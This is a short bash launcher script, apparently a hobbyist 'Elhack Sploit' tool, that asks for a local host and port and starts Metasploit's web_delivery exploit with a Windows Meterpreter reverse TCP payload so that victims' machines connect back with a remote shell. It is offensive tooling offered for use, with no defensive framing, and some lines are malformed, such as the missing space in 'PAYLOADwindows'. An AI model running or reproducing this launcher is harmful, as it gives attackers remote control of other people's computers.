#!bin/bash
clear
echo "##########################
      ### Elhack Sploit      ###
      ### code :Hamza.elhack ###
      ### fb:fb.me/elhack.dz ###
      ##########################
"
read -p "Local host : " ip
read -p "Local Port : " port

msfconsole -x "use exploit/multi/script/web_delivery; set PAYLOADwindows/meterpreter/reverse_tcp; set LHOST $ip; set LPORT $port; set TARGETS 1; exploit"
clear
bash elhack.sh

